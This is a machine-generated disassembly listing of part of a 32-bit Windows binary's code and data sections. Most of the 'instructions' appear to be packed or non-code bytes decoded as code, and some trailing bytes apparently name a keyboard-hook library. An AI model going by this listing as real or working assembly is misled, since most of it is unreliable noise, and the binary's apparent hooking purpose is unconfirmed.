  4129f7:	jg     0x412a77
  4129f9:	jle    0x4129a9
  4129fb:	inc    edx
  4129fc:	pop    esp
  4129fd:	push   ebp
  4129fe:	fild   DWORD PTR [ebx+0x52]
  412a01:	mov    eax,fs
  412a03:	xchg   edi,eax
  412a04:	(bad)  
  412a05:	test   eax,0xba6cac37
  412a0a:	pop    ebp
  412a0b:	(bad)  
  412a0c:	or     ebx,ecx
  412a0e:	lahf   
  412a0f:	and    al,0x98
  412a11:	mov    ebp,0x38944fd1
  412a16:	adc    BYTE PTR [eax-0x9],ch
  412a19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a1a:	sti    
  412a1b:	retf   
  412a1c:	push   ebp
  412a1d:	or     DWORD PTR [edi+0x48],0xcb89626b
  412a24:	pop    es
  412a25:	mov    esp,0x923654a0
  412a2a:	jae    0x412a3e
  412a2c:	jb     0x412a33
  412a2e:	mov    dl,0x59
  412a30:	outs   dx,BYTE PTR ds:[esi]
  412a31:	sbb    eax,0x7c4dfb54
  412a36:	ins    BYTE PTR es:[edi],dx
  412a37:	add    al,0x39
  412a39:	mov    bl,0x97
  412a3b:	dec    edi
  412a3c:	ja     0x412a90
  412a3e:	mov    bl,0xf9
  412a40:	pop    esi
  412a41:	inc    edx
  412a42:	xchg   ecx,eax
  412a43:	dec    esi
  412a44:	outs   dx,DWORD PTR ds:[esi]
  412a45:	in     eax,0xab
  412a47:	mov    esi,0x8f3e5819
  412a4c:	pop    ds
  412a4d:	sbb    BYTE PTR [ecx+0x37],dl
  412a50:	jbe    0x412a0f
  412a52:	sahf   
  412a53:	ret    
  412a54:	call   0xb56de373
  412a59:	rcr    DWORD PTR [eax-0x77861da],0xaf
  412a60:	mov    edi,0x81a8e008
  412a65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a66:	mov    al,0x1b
  412a68:	lds    eax,FWORD PTR [esi-0x4d]
  412a6b:	test   DWORD PTR [edx-0x2f],0xbd9c6f54
  412a72:	lock xchg esp,eax
  412a74:	aam    0xae
  412a76:	inc    eax
  412a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a78:	bound  ecx,QWORD PTR [eax+0x7b]
  412a7b:	pop    edi
  412a7c:	adc    eax,0x67191bfd
  412a81:	and    eax,0xc120d186
  412a86:	gs jg  0x412a0e
  412a89:	cld    
  412a8a:	mov    dh,0x66
  412a8c:	add    dh,BYTE PTR [ecx+0x2e3f3773]
  412a92:	daa    
  412a93:	mov    dl,0xb0
  412a95:	inc    ebp
  412a96:	mov    dl,0xa5
  412a98:	jmp    0x412ae4
  412a9a:	sbb    al,0xa1
  412a9c:	or     edx,DWORD PTR [ecx-0x45]
  412a9f:	ret    0x1c1b
  412aa2:	dec    eax
  412aa3:	mov    BYTE PTR [ebp+0x1b95ad49],dl
  412aa9:	xchg   esi,eax
  412aaa:	stos   BYTE PTR es:[edi],al
  412aab:	movlhps xmm4,xmm0
  412aae:	in     eax,dx
  412aaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ab0:	mov    fs,WORD PTR [ebx]
  412ab2:	cmp    bl,0xae
  412ab5:	xchg   ecx,eax
  412ab6:	xor    ah,BYTE PTR [eax+0x5b]
  412ab9:	add    al,cl
  412abb:	lds    ecx,FWORD PTR [eax]
  412abd:	sbb    ebx,esi
  412abf:	push   esi
  412ac0:	fst    DWORD PTR [edx]
  412ac2:	lods   eax,DWORD PTR ds:[esi]
  412ac3:	sar    BYTE PTR [ebx],0xd9
  412ac6:	inc    esi
  412ac7:	sub    al,BYTE PTR [edx-0x572c525a]
  412acd:	retf   0xe3ac
  412ad0:	les    ebp,FWORD PTR [esi]
  412ad2:	or     DWORD PTR [ebp-0xc1503dc],eax
  412ad8:	cmp    edi,DWORD PTR [edx-0x4ddec026]
  412ade:	cwde   
  412adf:	xor    ebp,ebp
  412ae1:	jmp    0x412b4a
  412ae3:	shl    BYTE PTR [ebx+0x617e3338],0xa0
  412aea:	inc    esi
  412aeb:	and    DWORD PTR [esi+0x1a9ef107],edi
  412af1:	sub    eax,DWORD PTR [ecx-0x55d93877]
  412af7:	push   ecx
  412af8:	mov    ebp,0x6d8e75aa
  412afd:	or     ecx,DWORD PTR [ebp-0x7c2e74b0]
  412b03:	mov    esp,esp
  412b05:	push   0x74a8108f
  412b0a:	aam    0x7b
  412b0c:	(bad)  [ebx+0x4a]
  412b0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b10:	and    BYTE PTR [esi],al
  412b12:	das    
  412b13:	enter  0xa056,0x60
  412b17:	outs   dx,BYTE PTR ds:[esi]
  412b18:	retf   0xea8f
  412b1b:	push   cs
  412b1c:	jnp    0x412b50
  412b1e:	sbb    esp,esi
  412b20:	(bad)  
  412b21:	es ss std 
  412b24:	mov    cl,0xd0
  412b26:	mov    ah,0xab
  412b28:	pushf  
  412b29:	mov    ds:0xa43c248e,al
  412b2e:	pop    es
  412b2f:	fidiv  DWORD PTR [eax-0x8]
  412b32:	cmc    
  412b33:	mov    esp,0x82985acc
  412b38:	fs pop esp
  412b3a:	inc    eax
  412b3b:	fsub   QWORD PTR [esi]
  412b3d:	dec    edx
  412b3e:	loope  0x412b8e
  412b40:	cmp    edx,esi
  412b42:	mov    BYTE PTR [edi],cl
  412b44:	bound  esp,QWORD PTR [eax+0x6aa085ac]
  412b4a:	leave  
  412b4b:	call   0x2d2e4e53
  412b50:	nop
  412b51:	mov    bl,0x65
  412b53:	and    BYTE PTR [edi-0x66],ch
  412b56:	push   es
  412b57:	mov    esp,edi
  412b59:	ja     0x412b9a
  412b5b:	aas    
  412b5c:	das    
  412b5d:	add    BYTE PTR [ecx-0x3db925a4],cl
  412b63:	adc    edi,DWORD PTR ds:0xde7993d
  412b69:	adc    ch,bl
  412b6b:	(bad)  
  412b6c:	pop    edi
  412b6d:	push   ebx
  412b6e:	sbb    edi,edi
  412b70:	dec    esi
  412b71:	mov    eax,ds:0x4b25d2e2
  412b76:	or     eax,edx
  412b78:	push   es
  412b79:	adc    eax,0x957bb905
  412b7e:	dec    ecx
  412b7f:	(bad)  
  412b80:	retf   
  412b81:	dec    esi
  412b82:	push   eax
  412b83:	mov    ecx,ebx
  412b85:	out    0xc2,eax
  412b87:	pop    esp
  412b88:	fisub  WORD PTR [esi-0x6b]
  412b8b:	push   edx
  412b8c:	arpl   WORD PTR [esi+0x1b],cx
  412b8f:	or     BYTE PTR [ecx+edi*2],ch
  412b92:	lods   al,BYTE PTR ds:[esi]
  412b93:	adc    ebp,edi
  412b95:	fldpi  
  412b97:	push   esi
  412b98:	sub    DWORD PTR [edi-0x59f7e53a],esi
  412b9e:	pop    esp
  412b9f:	mov    esp,?
  412ba1:	es push 0xf
  412ba4:	or     BYTE PTR [edi-0x5c],bl
  412ba7:	les    ebp,FWORD PTR [eax-0xe782ee]
  412bad:	(bad)  
  412bae:	dec    esi
  412baf:	rol    DWORD PTR [esp+eax*1-0x8],0x20
  412bb4:	shl    DWORD PTR [eax+ebp*2+0x2ddad296],1
  412bbb:	imul   eax,DWORD PTR [ecx-0x405a6c68],0x70ebe461
  412bc5:	jmp    0x2307d54f
  412bca:	cwde   
  412bcb:	sbb    eax,0x79b823b5
  412bd0:	retf   0xf636
  412bd3:	aas    
  412bd4:	mov    esi,eax
  412bd6:	jl     0x412b71
  412bd8:	ret    0xdadc
  412bdb:	push   ecx
  412bdc:	push   ebp
  412bdd:	push   0x4
  412bdf:	pop    ebx
  412be0:	inc    ebx
  412be1:	xchg   ebx,ecx
  412be3:	sub    ebx,ecx
  412be5:	xchg   ebx,ecx
  412be7:	dec    ecx
  412be8:	mov    eax,DWORD PTR [ebp-0x1c]
  412beb:	imul   eax,ecx
  412bee:	add    esp,eax
  412bf0:	xchg   edx,eax
  412bf1:	push   eax
  412bf2:	xor    ebx,ebx
  412bf4:	mov    edx,esp
  412bf6:	dec    edx
  412bf7:	inc    ebx
  412bf8:	add    ebx,DWORD PTR [edx+ebx*1]
  412bfb:	dec    ebx
  412bfc:	xor    edx,edx
  412bfe:	add    DWORD PTR [ebp-0xc],ebx
  412c01:	pop    ebx
  412c02:	mov    eax,DWORD PTR [ebp-0xc]
  412c05:	pop    edi
  412c06:	pop    esi
  412c07:	pop    ebx
  412c08:	leave  
  412c09:	ret    0x10

Disassembly of section .data:

00413000 <.data>:
  413000:	xor    al,0x39
  413002:	add    DWORD PTR [eax],eax
  413004:	inc    edx
  413005:	cmp    DWORD PTR [ecx],eax
  413007:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41300b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41300f:	add    BYTE PTR [esi+0x39],bl
  413012:	add    DWORD PTR [eax],eax
  413014:	push   0x39
  413016:	add    DWORD PTR [eax],eax
  413018:	jl     0x413053
  41301a:	add    DWORD PTR [eax],eax
  41301c:	xchg   BYTE PTR [ecx],bh
  41301e:	add    DWORD PTR [eax],eax
  413020:	xchg   esp,eax
  413021:	cmp    DWORD PTR [ecx],eax
  413023:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41302a:	add    DWORD PTR [eax],eax
  41302c:	mov    ah,0x39
  41302e:	add    DWORD PTR [eax],eax
  413030:	les    edi,FWORD PTR [ecx]
  413032:	add    DWORD PTR [eax],eax
  413034:	into   
  413035:	cmp    DWORD PTR [ecx],eax
  413037:	add    dh,dl
  413039:	cmp    DWORD PTR [ecx],eax
  41303b:	add    dl,ah
  41303d:	cmp    DWORD PTR [ecx],eax
  41303f:	add    dl,ch
  413041:	cmp    DWORD PTR [ecx],eax
  413043:	add    ah,dh
  413045:	cmp    DWORD PTR [ecx],eax
  413047:	add    ah,bh
  413049:	cmp    DWORD PTR [ecx],eax
  41304b:	add    BYTE PTR [eax],cl
  41304d:	cmp    al,BYTE PTR [ecx]
  41304f:	add    BYTE PTR [edx],dl
  413051:	cmp    al,BYTE PTR [ecx]
  413053:	add    BYTE PTR [edx],bl
  413055:	cmp    al,BYTE PTR [ecx]
  413057:	add    BYTE PTR [edx+edi*1],ah
  41305a:	add    DWORD PTR [eax],eax
  41305c:	xor    BYTE PTR [edx],bh
  41305e:	add    DWORD PTR [eax],eax
  413060:	cmp    bh,BYTE PTR [edx]
  413062:	add    DWORD PTR [eax],eax
  413064:	dec    eax
  413065:	cmp    al,BYTE PTR [ecx]
  413067:	add    BYTE PTR [edx+0x3a],dl
  41306a:	add    DWORD PTR [eax],eax
  41306c:	pop    esi
  41306d:	cmp    al,BYTE PTR [ecx]
  41306f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413073:	add    BYTE PTR [edx+0x3a],bh
  413076:	add    DWORD PTR [eax],eax
  413078:	test   BYTE PTR [edx],bh
  41307a:	add    DWORD PTR [eax],eax
  41307c:	mov    ?,WORD PTR [edx]
  41307e:	add    DWORD PTR [eax],eax
  413080:	cwde   
  413081:	cmp    al,BYTE PTR [ecx]
  413083:	add    BYTE PTR [edx-0x55fffec6],ah
  413089:	cmp    al,BYTE PTR [ecx]
  41308b:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  413092:	add    DWORD PTR [eax],eax
  413094:	enter  0x13a,0x0
  413098:	fdivr  QWORD PTR [edx]
  41309a:	add    DWORD PTR [eax],eax
  41309c:	out    0x3a,al
  41309e:	add    DWORD PTR [eax],eax
  4130a0:	repnz cmp al,BYTE PTR [ecx]
  4130a3:	add    dh,bh
  4130a5:	cmp    al,BYTE PTR [ecx]
  4130a7:	add    BYTE PTR [eax],cl
  4130a9:	cmp    eax,DWORD PTR [ecx]
  4130ab:	add    BYTE PTR [eax],bl
  4130ad:	cmp    eax,DWORD PTR [ecx]
  4130af:	add    BYTE PTR [eax],al
  4130b1:	add    BYTE PTR [eax],al
  4130b3:	add    BYTE PTR [esi],ch
  4130b5:	cmp    eax,DWORD PTR [ecx]
  4130b7:	add    BYTE PTR [edx+0x3b],al
  4130ba:	add    DWORD PTR [eax],eax
  4130bc:	pop    eax
  4130bd:	cmp    eax,DWORD PTR [ecx]
  4130bf:	add    BYTE PTR [eax+0x3b],ch
  4130c2:	add    DWORD PTR [eax],eax
  4130c4:	je     0x413101
  4130c6:	add    DWORD PTR [eax],eax
  4130c8:	nop
  4130c9:	cmp    eax,DWORD PTR [ecx]
  4130cb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4130d2:	add    DWORD PTR [eax],eax
  4130d4:	int3   
  4130d5:	cmp    eax,DWORD PTR [ecx]
  4130d7:	add    dl,bl
  4130d9:	cmp    eax,DWORD PTR [ecx]
  4130db:	add    dh,ah
  4130dd:	cmp    eax,DWORD PTR [ecx]
  4130df:	add    al,bh
  4130e1:	cmp    eax,DWORD PTR [ecx]
  4130e3:	add    BYTE PTR [esp+edi*1],cl
  4130e6:	add    DWORD PTR [eax],eax
  4130e8:	sbb    bh,BYTE PTR [ecx+eax*1]
  4130eb:	add    BYTE PTR [edx],ch
  4130ed:	cmp    al,0x1
  4130ef:	add    BYTE PTR [edx],bh
  4130f1:	cmp    al,0x1
  4130f3:	add    BYTE PTR [esi+0x3c],cl
  4130f6:	add    DWORD PTR [eax],eax
  4130f8:	pop    edx
  4130f9:	cmp    al,0x1
  4130fb:	add    BYTE PTR [edx+0x3c],ch
  4130fe:	add    DWORD PTR [eax],eax
  413100:	js     0x41313e
  413102:	add    DWORD PTR [eax],eax
  413104:	xchg   edx,eax
  413105:	cmp    al,0x1
  413107:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41310e:	add    DWORD PTR [eax],eax
  413110:	ret    0x13c
  413113:	add    ah,dl
  413115:	cmp    al,0x1
  413117:	add    dh,ah
  413119:	cmp    al,0x1
  41311b:	add    ah,dh
  41311d:	cmp    al,0x1
  41311f:	add    dh,bh
  413121:	cmp    al,0x1
  413123:	add    BYTE PTR [esi],cl
  413125:	cmp    eax,0x3d1e0001
  41312a:	add    DWORD PTR [eax],eax
  41312c:	sub    al,0x3d
  41312e:	add    DWORD PTR [eax],eax
  413130:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413136:	add    DWORD PTR [eax],eax
  413138:	pop    eax
  413139:	cmp    eax,0x3d6e0001
  41313e:	add    DWORD PTR [eax],eax
  413140:	cmp    BYTE PTR ds:0x3d920001,0x1
  413147:	add    BYTE PTR [esi-0x45fffec3],ah
  41314d:	cmp    eax,0x3dce0001
  413152:	add    DWORD PTR [eax],eax
  413154:	jmp    0x13d:0xf800013d
  41315b:	add    BYTE PTR [esi],al
  41315d:	add    DWORD PTR ds:[eax],eax
  413160:	sbb    al,0x3e
  413162:	add    DWORD PTR [eax],eax
  413164:	sub    bh,BYTE PTR [esi]
  413166:	add    DWORD PTR [eax],eax
  413168:	cmp    al,0x3e
  41316a:	add    DWORD PTR [eax],eax
  41316c:	dec    eax
  41316d:	add    DWORD PTR ds:[eax],eax
  413170:	pop    esp
  413171:	add    DWORD PTR ds:[eax],eax
  413174:	ins    BYTE PTR es:[edi],dx
  413175:	add    DWORD PTR ds:[eax],eax
  413178:	jl     0x4131b8
  41317a:	add    DWORD PTR [eax],eax
  41317c:	mov    BYTE PTR [esi],bh
  41317e:	add    DWORD PTR [eax],eax
  413180:	cwde   
  413181:	add    DWORD PTR ds:[eax],eax
  413184:	lods   al,BYTE PTR ds:[esi]
  413185:	add    DWORD PTR ds:[eax],eax
  413188:	mov    edx,0xcc00013e
  41318d:	add    DWORD PTR ds:[eax],eax
  413190:	fidivr DWORD PTR [esi]
  413192:	add    DWORD PTR [eax],eax
  413194:	lock add DWORD PTR ds:[eax],eax
  413198:	(bad)  
  413199:	add    DWORD PTR ds:[eax],eax
  41319c:	push   cs
  41319d:	aas    
  41319e:	add    DWORD PTR [eax],eax
  4131a0:	sbb    bh,BYTE PTR [edi]
  4131a2:	add    DWORD PTR [eax],eax
  4131a4:	sub    bh,BYTE PTR [edi]
  4131a6:	add    DWORD PTR [eax],eax
  4131a8:	cmp    BYTE PTR [edi],bh
  4131aa:	add    DWORD PTR [eax],eax
  4131ac:	dec    esi
  4131ad:	aas    
  4131ae:	add    DWORD PTR [eax],eax
  4131b0:	bound  edi,QWORD PTR [edi]
  4131b2:	add    DWORD PTR [eax],eax
  4131b4:	outs   dx,BYTE PTR ds:[esi]
  4131b5:	aas    
  4131b6:	add    DWORD PTR [eax],eax
  4131b8:	js     0x4131f9
  4131ba:	add    DWORD PTR [eax],eax
  4131bc:	xchg   BYTE PTR [edi],bh
  4131be:	add    DWORD PTR [eax],eax
  4131c0:	xchg   esp,eax
  4131c1:	aas    
  4131c2:	add    DWORD PTR [eax],eax
  4131c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c5:	aas    
  4131c6:	add    DWORD PTR [eax],eax
  4131c8:	mov    dh,0x3f
  4131ca:	add    DWORD PTR [eax],eax
  4131cc:	enter  0x13f,0x0
  4131d0:	fidivr DWORD PTR [edi]
  4131d2:	add    DWORD PTR [eax],eax
  4131d4:	in     al,dx
  4131d5:	aas    
  4131d6:	add    DWORD PTR [eax],eax
  4131d8:	clc    
  4131d9:	aas    
  4131da:	add    DWORD PTR [eax],eax
  4131dc:	or     al,BYTE PTR [eax+0x1]
  4131df:	add    BYTE PTR [edx],ah
  4131e1:	inc    eax
  4131e2:	add    DWORD PTR [eax],eax
  4131e4:	xor    al,0x40
  4131e6:	add    DWORD PTR [eax],eax
  4131e8:	dec    eax
  4131e9:	inc    eax
  4131ea:	add    DWORD PTR [eax],eax
  4131ec:	pop    edx
  4131ed:	inc    eax
  4131ee:	add    DWORD PTR [eax],eax
  4131f0:	fs inc eax
  4131f2:	add    DWORD PTR [eax],eax
  4131f4:	je     0x413236
  4131f6:	add    DWORD PTR [eax],eax
  4131f8:	add    BYTE PTR [eax+0x1],0x0
  4131fc:	cwde   
  4131fd:	inc    eax
  4131fe:	add    DWORD PTR [eax],eax
  413200:	lods   al,BYTE PTR ds:[esi]
  413201:	inc    eax
  413202:	add    DWORD PTR [eax],eax
  413204:	mov    esp,0xca000140
  413209:	inc    eax
  41320a:	add    DWORD PTR [eax],eax
  41320c:	loopne 0x41324e
  41320e:	add    DWORD PTR [eax],eax
  413210:	lock inc eax
  413212:	add    DWORD PTR [eax],eax
  413214:	or     BYTE PTR [ecx+0x1],al
  413217:	add    BYTE PTR [esi],dl
  413219:	inc    ecx
  41321a:	add    DWORD PTR [eax],eax
  41321c:	sub    BYTE PTR [ecx+0x1],al
  41321f:	add    BYTE PTR [esi],dh
  413221:	inc    ecx
  413222:	add    DWORD PTR [eax],eax
  413224:	inc    esp
  413225:	inc    ecx
  413226:	add    DWORD PTR [eax],eax
  413228:	push   edx
  413229:	inc    ecx
  41322a:	add    DWORD PTR [eax],eax
  41322c:	pusha  
  41322d:	inc    ecx
  41322e:	add    DWORD PTR [eax],eax
  413230:	jo     0x413273
  413232:	add    DWORD PTR [eax],eax
  413234:	test   BYTE PTR [ecx+0x1],al
  413237:	add    BYTE PTR [edx-0x5ffffebf],dl
  41323d:	inc    ecx
  41323e:	add    DWORD PTR [eax],eax
  413240:	scas   al,BYTE PTR es:[edi]
  413241:	inc    ecx
  413242:	add    DWORD PTR [eax],eax
  413244:	mov    esi,0xd6000141
  413249:	inc    ecx
  41324a:	add    DWORD PTR [eax],eax
  41324c:	call   0xfa413392
  413251:	inc    ecx
  413252:	add    DWORD PTR [eax],eax
  413254:	push   es
  413255:	inc    edx
  413256:	add    DWORD PTR [eax],eax
  413258:	sbb    BYTE PTR [edx+0x1],al
  41325b:	add    BYTE PTR [esi],ch
  41325d:	inc    edx
  41325e:	add    DWORD PTR [eax],eax
  413260:	cmp    al,BYTE PTR [edx+0x1]
  413263:	add    BYTE PTR [esi+0x42],cl
  413266:	add    DWORD PTR [eax],eax
  413268:	pusha  
  413269:	inc    edx
  41326a:	add    DWORD PTR [eax],eax
  41326c:	add    BYTE PTR [eax],al
  41326e:	add    BYTE PTR [eax],al
  413270:	add    BYTE PTR [edx+0x1],0x0
  413274:	cwde   
  413275:	inc    edx
  413276:	add    DWORD PTR [eax],eax
  413278:	scas   al,BYTE PTR es:[edi]
  413279:	inc    edx
  41327a:	add    DWORD PTR [eax],eax
  41327c:	mov    edx,0xca000142
  413281:	inc    edx
  413282:	add    DWORD PTR [eax],eax
  413284:	fadd   QWORD PTR [edx+0x1]
  413287:	add    ah,ch
  413289:	inc    edx
  41328a:	add    DWORD PTR [eax],eax
  41328c:	clc    
  41328d:	inc    edx
  41328e:	add    DWORD PTR [eax],eax
  413290:	push   cs
  413291:	inc    ebx
  413292:	add    DWORD PTR [eax],eax
  413294:	sbb    BYTE PTR [ebx+0x1],al
  413297:	add    BYTE PTR [ebx+eax*2],ah
  41329a:	add    DWORD PTR [eax],eax
  41329c:	xor    al,BYTE PTR [ebx+0x1]
  41329f:	add    BYTE PTR [edx+0x43],al
  4132a2:	add    DWORD PTR [eax],eax
  4132a4:	push   eax
  4132a5:	inc    ebx
  4132a6:	add    DWORD PTR [eax],eax
  4132a8:	pop    edx
  4132a9:	inc    ebx
  4132aa:	add    DWORD PTR [eax],eax
  4132ac:	outs   dx,BYTE PTR ds:[esi]
  4132ad:	inc    ebx
  4132ae:	add    DWORD PTR [eax],eax
  4132b0:	test   BYTE PTR [ebx+0x1],al
  4132b3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4132ba:	add    DWORD PTR [eax],eax
  4132bc:	mov    eax,0xcc000143
  4132c1:	inc    ebx
  4132c2:	add    DWORD PTR [eax],eax
  4132c4:	fiadd  DWORD PTR [ebx+0x1]
  4132c7:	add    dl,ch
  4132c9:	inc    ebx
  4132ca:	add    DWORD PTR [eax],eax
  4132cc:	clc    
  4132cd:	inc    ebx
  4132ce:	add    DWORD PTR [eax],eax
  4132d0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4132d4:	adc    al,0x44
  4132d6:	add    DWORD PTR [eax],eax
  4132d8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4132dc:	xor    al,0x44
  4132de:	add    DWORD PTR [eax],eax
  4132e0:	inc    esi
  4132e1:	inc    esp
  4132e2:	add    DWORD PTR [eax],eax
  4132e4:	pop    edx
  4132e5:	inc    esp
  4132e6:	add    DWORD PTR [eax],eax
  4132e8:	inc    sp
  4132ea:	add    DWORD PTR [eax],eax
  4132ec:	jbe    0x413332
  4132ee:	add    DWORD PTR [eax],eax
  4132f0:	mov    es,WORD PTR [ecx+eax*1+0x0]
  4132f4:	sahf   
  4132f5:	inc    esp
  4132f6:	add    DWORD PTR [eax],eax
  4132f8:	scas   al,BYTE PTR es:[edi]
  4132f9:	inc    esp
  4132fa:	add    DWORD PTR [eax],eax
  4132fc:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413301:	inc    esp
  413302:	add    DWORD PTR [eax],eax
  413304:	in     al,dx
  413305:	inc    esp
  413306:	add    DWORD PTR [eax],eax
  413308:	clc    
  413309:	inc    esp
  41330a:	add    DWORD PTR [eax],eax
  41330c:	or     al,BYTE PTR [ebp+0x1]
  41330f:	add    BYTE PTR [esi],bl
  413311:	inc    ebp
  413312:	add    DWORD PTR [eax],eax
  413314:	sub    BYTE PTR [ebp+0x1],al
  413317:	add    BYTE PTR [eax],bh
  413319:	inc    ebp
  41331a:	add    DWORD PTR [eax],eax
  41331c:	inc    esp
  41331d:	inc    ebp
  41331e:	add    DWORD PTR [eax],eax
  413320:	dec    esi
  413321:	inc    ebp
  413322:	add    DWORD PTR [eax],eax
  413324:	pop    edx
  413325:	inc    ebp
  413326:	add    DWORD PTR [eax],eax
  413328:	add    BYTE PTR [eax],al
  41332a:	add    BYTE PTR [eax],al
  41332c:	jbe    0x413373
  41332e:	add    DWORD PTR [eax],eax
  413330:	mov    BYTE PTR [ebp+0x1],al
  413333:	add    BYTE PTR [eax-0x51fffebb],ah
  413339:	inc    ebp
  41333a:	add    DWORD PTR [eax],eax
  41333c:	retf   0x145
  41333f:	add    ah,bl
  413341:	inc    ebp
  413342:	add    DWORD PTR [eax],eax
  413344:	in     al,dx
  413345:	inc    ebp
  413346:	add    DWORD PTR [eax],eax
  413348:	add    BYTE PTR [esi+0x1],al
  41334b:	add    BYTE PTR [eax],bl
  41334d:	inc    esi
  41334e:	add    DWORD PTR [eax],eax
  413350:	sub    al,BYTE PTR [esi+0x1]
  413353:	add    BYTE PTR [esi],dh
  413355:	inc    esi
  413356:	add    DWORD PTR [eax],eax
  413358:	dec    edx
  413359:	inc    esi
  41335a:	add    DWORD PTR [eax],eax
  41335c:	pusha  
  41335d:	inc    esi
  41335e:	add    DWORD PTR [eax],eax
  413360:	ins    BYTE PTR es:[edi],dx
  413361:	inc    esi
  413362:	add    DWORD PTR [eax],eax
  413364:	add    BYTE PTR [esi+0x1],0x0
  413368:	xchg   esp,eax
  413369:	inc    esi
  41336a:	add    DWORD PTR [eax],eax
  41336c:	mov    al,ds:0xae000146
  413371:	inc    esi
  413372:	add    DWORD PTR [eax],eax
  413374:	ret    0x146
  413377:	add    dl,bl
  413379:	inc    esi
  41337a:	add    DWORD PTR [eax],eax
  41337c:	call   0xf24134c7
  413381:	inc    esi
  413382:	add    DWORD PTR [eax],eax
  413384:	inc    BYTE PTR [esi+0x1]
  413387:	add    BYTE PTR [esi],cl
  413389:	inc    edi
  41338a:	add    DWORD PTR [eax],eax
  41338c:	and    al,0x47
  41338e:	add    DWORD PTR [eax],eax
  413390:	cmp    al,BYTE PTR [edi+0x1]
  413393:	add    BYTE PTR [edi+eax*2+0x1],cl
  413397:	add    BYTE PTR [edx+0x47],bl
  41339a:	add    DWORD PTR [eax],eax
  41339c:	push   0x47
  41339e:	add    DWORD PTR [eax],eax
  4133a0:	jle    0x4133e9
  4133a2:	add    DWORD PTR [eax],eax
  4133a4:	xchg   esi,eax
  4133a5:	inc    edi
  4133a6:	add    DWORD PTR [eax],eax
  4133a8:	mov    ds:0xba000147,al
  4133ad:	inc    edi
  4133ae:	add    DWORD PTR [eax],eax
  4133b0:	int3   
  4133b1:	inc    edi
  4133b2:	add    DWORD PTR [eax],eax
  4133b4:	fadd   QWORD PTR [edi+0x1]
  4133b7:	add    al,dh
  4133b9:	inc    edi
  4133ba:	add    DWORD PTR [eax],eax
  4133bc:	push   es
  4133bd:	dec    eax
  4133be:	add    DWORD PTR [eax],eax
  4133c0:	sbb    cl,BYTE PTR [eax+0x1]
  4133c3:	add    BYTE PTR [eax],ch
  4133c5:	dec    eax
  4133c6:	add    DWORD PTR [eax],eax
  4133c8:	cmp    cl,BYTE PTR [eax+0x1]
  4133cb:	add    BYTE PTR [eax+0x48],cl
  4133ce:	add    DWORD PTR [eax],eax
  4133d0:	push   esp
  4133d1:	dec    eax
  4133d2:	add    DWORD PTR [eax],eax
  4133d4:	outs   dx,BYTE PTR ds:[esi]
  4133d5:	dec    eax
  4133d6:	add    DWORD PTR [eax],eax
  4133d8:	mov    BYTE PTR [eax+0x1],cl
  4133db:	add    BYTE PTR [eax-0x59fffeb8],bl
  4133e1:	dec    eax
  4133e2:	add    DWORD PTR [eax],eax
  4133e4:	mov    dl,0x48
  4133e6:	add    DWORD PTR [eax],eax
  4133e8:	ror    BYTE PTR [eax+0x1],0x0
  4133ec:	(bad)  
  4133ed:	dec    eax
  4133ee:	add    DWORD PTR [eax],eax
  4133f0:	add    BYTE PTR [eax],al
  4133f2:	add    BYTE PTR [eax],al
  4133f4:	lock dec eax
  4133f6:	add    DWORD PTR [eax],eax
  4133f8:	dec    BYTE PTR [eax+0x1]
  4133fb:	add    BYTE PTR [esi],cl
  4133fd:	dec    ecx
  4133fe:	add    DWORD PTR [eax],eax
  413400:	push   ds
  413401:	dec    ecx
  413402:	add    DWORD PTR [eax],eax
  413404:	cs dec ecx
  413406:	add    DWORD PTR [eax],eax
  413408:	add    BYTE PTR [eax],al
  41340a:	add    BYTE PTR [eax],al
  41340c:	push   eax
  41340d:	dec    ecx
  41340e:	add    DWORD PTR [eax],eax
	...
  413418:	stos   DWORD PTR es:[edi],eax
  413419:	inc    ebx
  41341a:	push   ebp
  41341b:	dec    ebp
  41341c:	add    BYTE PTR [eax],al
  41341e:	add    BYTE PTR [eax],al
  413420:	add    al,BYTE PTR [eax]
  413422:	add    BYTE PTR [eax],al
  413424:	cmp    eax,0x43000000
  413429:	dec    edx
  41342a:	add    eax,DWORD PTR [eax]
  41342c:	inc    ebx
  41342d:	cmp    al,0x3
	...
  413437:	add    BYTE PTR [ebx+0x4d5543],ch
  41343d:	add    BYTE PTR [eax],al
  41343f:	add    BYTE PTR [esi+0x34],ah
  413442:	add    DWORD PTR [eax],eax
  413444:	add    DWORD PTR [eax],eax
  413446:	add    BYTE PTR [eax],al
  413448:	add    DWORD PTR [eax],eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	add    DWORD PTR [eax],eax
  41344e:	add    BYTE PTR [eax],al
  413450:	pop    esp
  413451:	xor    al,0x1
  413453:	add    BYTE PTR [eax+0x34],ah
  413456:	add    DWORD PTR [eax],eax
  413458:	fs xor al,0x1
  41345b:	add    ch,cl
  41345d:	sub    BYTE PTR [eax],al
  41345f:	add    BYTE PTR [edi+0x34],dh
  413462:	add    DWORD PTR [eax],eax
  413464:	add    BYTE PTR [eax],al
  413466:	jb     0x4134d5
  413468:	ins    DWORD PTR es:[edi],dx
  413469:	pop    ecx
  41346a:	dec    eax
  41346b:	outs   dx,DWORD PTR ds:[esi]
  41346c:	imul   ecx,DWORD PTR [eax+0x6c],0x68
  413470:	ja     0x4134e1
  413472:	imul   ebp,DWORD PTR cs:[esi+0x73],0x69483f00
  41347a:	fs gs dec ebx
  41347d:	gs jns 0x4134e2
  413480:	outs   dx,DWORD PTR ds:[esi]
  413481:	popa   
  413482:	jb     0x4134e8
  413484:	dec    esi
